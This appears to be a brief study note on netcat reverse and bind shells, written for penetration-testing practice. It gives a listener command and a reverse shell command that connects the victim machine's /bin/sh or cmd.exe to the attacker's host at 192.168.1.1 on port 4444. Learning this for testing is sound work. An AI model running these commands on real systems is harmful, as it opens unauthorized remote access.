Reverse Shell    This is the most common
	using a tool called `netcat`.  Reverse shell means we are making the victim computer connect to us.

	`nc -lvp 4444` this will start netcat `nc` to listen verbose on port `-lvp` 4444
		Can also use -n to turn off DNS
	`nc 192.168.1.1 4444 -e /bin/sh` on the target instructs netcat `nc` to connect to 192.168.1.1 on port 4444 and establish `-e` a shell `/bin/sh` for linux (or `cmd.exe` on a Windows device)


Bind Shell
	Works like a reverse shell but backwards.  We open a port on the target machine and then connect to it from our machine.

	Syntax options are the same, just running them pretty much backwards from a Reverse Shell.

Reverse shells will mostly be used for internal testing.  Bind shells can come in handy though.  The victim will always be running the `-e /bin/bash` or `-e cmd.exe` no matter which shell you use.
